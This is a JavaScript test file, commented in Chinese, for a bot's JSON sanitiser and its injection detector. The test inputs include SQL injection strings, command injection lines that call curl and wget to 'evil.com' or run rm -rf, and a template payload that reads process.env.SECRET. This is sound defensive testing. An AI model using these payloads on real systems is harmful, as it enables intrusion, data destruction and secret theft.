// V0.3.3 測試：原型污染消毒 / 進階注入偵測（SQL/命令/模板）／誤判控制
const fs = require('fs');
const path = require('path');
const src = fs.readFileSync(path.join(__dirname, '..', 'bot.js'), 'utf8');

let pass = 0, fail = 0;
function check(name, actual, expected) {
    if (JSON.stringify(actual) === JSON.stringify(expected)) {
        pass++;
        console.log(`✅ ${name}`);
    } else {
        fail++;
        console.log(`❌ ${name}: 期望 ${JSON.stringify(expected)}，實際 ${JSON.stringify(actual)}`);
    }
}

// ===== sanitizeJSON =====
const sStart = src.indexOf('function sanitizeJSON');
const sEnd = src.indexOf('function loadJSON');
if (sStart === -1 || sEnd === -1) { console.error('❌ 找不到 sanitizeJSON'); process.exit(1); }
const sanitizeJSON = new Function(src.slice(sStart, sEnd) + '; return sanitizeJSON;')();

const protoObj = JSON.parse('{"a":1,"__proto__":{"polluted":true},"b":{"c":2,"constructor":{"x":1},"prototype":{"y":2}},"arr":[{"__proto__":{"z":3}},4]}');
const clean = sanitizeJSON(protoObj);
check('剝離 __proto__ 自有鍵', Object.prototype.hasOwnProperty.call(clean, '__proto__'), false);
check('無原型污染', clean.polluted === undefined, true);
check('剝離巢狀 constructor 自有鍵', Object.prototype.hasOwnProperty.call(clean.b, 'constructor'), false);
check('剝離巢狀 prototype 鍵', Object.prototype.hasOwnProperty.call(clean.b, 'prototype'), false);
check('剝離陣列內 __proto__ 自有鍵', Object.prototype.hasOwnProperty.call(clean.arr[0], '__proto__'), false);
check('正常資料保留', clean.a === 1 && clean.arr[1] === 4, true);
check('非物件安全', sanitizeJSON(null), null);
check('原始值安全', sanitizeJSON('str'), 'str');

// ===== detectInjection =====
const dStart = src.indexOf('function detectInjection');
const dEnd = src.indexOf('// V0.2.9：Webhook 名稱假冒偵測');
if (dStart === -1 || dEnd === -1) { console.error('❌ 找不到 detectInjection'); process.exit(1); }
const detectInjection = new Function(src.slice(dStart, dEnd) + '; return detectInjection;')();

// SQL 注入
check('SQL 恆真條件', detectInjection("' OR '1'='1"), 'SQL 注入（恆真條件）');
check('SQL UNION SELECT', detectInjection('x UNION SELECT username,password FROM users'), 'SQL 注入（UNION SELECT）');
check('SQL 破壞性語句', detectInjection('; DROP TABLE users'), 'SQL 注入（破壞性語句）');
check('SQL 注釋繞過', detectInjection("a' OR 'b'='c' --"), 'SQL 注入（注釋繞過）');
// 命令注入
check('命令注入分號', detectInjection('; rm -rf /tmp/x'), '命令注入（分號鏈接）');
check('命令注入管道', detectInjection('| sh -c id'), '命令注入（管道執行）');
check('命令注入 $()', detectInjection('$(curl http://evil.com)'), '命令注入（$() 執行）');
check('命令注入反引號', detectInjection('`wget http://evil.com/a`'), '命令注入（反引號執行）');
// JS/模板注入
check('JS 惡意模板', detectInjection('${process.env.SECRET}'), 'JS 注入（惡意模板）');
check('模板注入', detectInjection('{{config.settings.admin}}'), '模板注入');
// 誤判控制
check('正常 SQL 教學不誤判', detectInjection('SELECT * FROM users WHERE id = 1'), null);
check('正常模板字串不誤判', detectInjection('歡迎 ${name} 加入！'), null);
check('正常聊天不誤判', detectInjection('今天天氣真好，一起去吃飯吧'), null);
check('含等號的正常句子不誤判', detectInjection('a = b 是程式作業嗎'), null);
// 資源防禦：超長回 null
check('超長訊息不跑重偵測', detectInjection('x'.repeat(4001)), null);

console.log(`\n========== ${fail === 0 ? '全部通過' : '有失敗'}（${pass} 通過 / ${fail} 失敗）==========`);
process.exit(fail === 0 ? 0 : 1);
